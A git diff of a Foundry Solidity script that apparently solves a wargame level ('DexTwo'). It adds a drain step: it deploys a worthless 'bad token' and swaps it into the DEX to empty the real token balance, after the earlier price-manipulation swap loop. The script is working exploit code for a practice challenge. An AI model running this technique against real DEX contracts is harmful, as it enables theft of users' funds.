@@ -2,12 +2,12 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import { Dex } from "../src/Dex.sol";
+import { DexTwo, SwappableTokenTwo } from "../src/DexTwo.sol";
 
 
-contract DexSolver is Script {
+contract DexTwoSolver is Script {
 	
-	Dex public instance = Dex(0x41CE51620da472D575f765F6b5AC96d7Ca7c3f5f);
+	DexTwo public instance = DexTwo(0xF5a68BA2D6Ea9301065A6f3A8b03058cbc337C4A);
 
 	uint256 prv = vm.envUint("PRV");
 	address me = vm.envAddress("PUB");
@@ -22,6 +22,7 @@ contract DexSolver is Script {
 
         address t1 = instance.token1();
         address t2 = instance.token2();
+        SwappableTokenTwo t3Token = new SwappableTokenTwo(address(instance), "bad token", "B4D_TKN", 100);
 
         instance.approve(address(instance), 1000);
 
@@ -30,8 +31,6 @@ contract DexSolver is Script {
         console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));
         console.logBytes32(bytes32(instance.balanceOf(t1, me)));
         console.logBytes32(bytes32(instance.balanceOf(t2, me)));
-        console.logBytes32(bytes32(instance.getSwapPrice(t1, t2, 1)));
-        console.logBytes32(bytes32(instance.getSwapPrice(t2, t1, 1)));
 
         uint256 b1 = instance.balanceOf(t1, address(instance));
         uint256 b2 = instance.balanceOf(t2, address(instance));
@@ -42,7 +41,6 @@ contract DexSolver is Script {
             t1 = t2;
             t2 = tmp;
             console.log("||||||  logging  |||||||");
-            console.log("swapping -- >");
             instance.swap(t1, t2, 
                 min(
                     instance.balanceOf(t1, me),
@@ -63,6 +61,17 @@ contract DexSolver is Script {
                 break;
         }
 
+        address t3 = address(t3Token);
+
+        console.log("draining the other token");
+
+
+        t3Token.approve(address(instance), 1000);
+        t3Token.transfer(address(instance), 10);
+        instance.swap(t3, t1, 10);
+
+        console.logBytes32(bytes32(instance.balanceOf(t1, address(instance))));
+        console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));
 
 		vm.stopBroadcast();
 
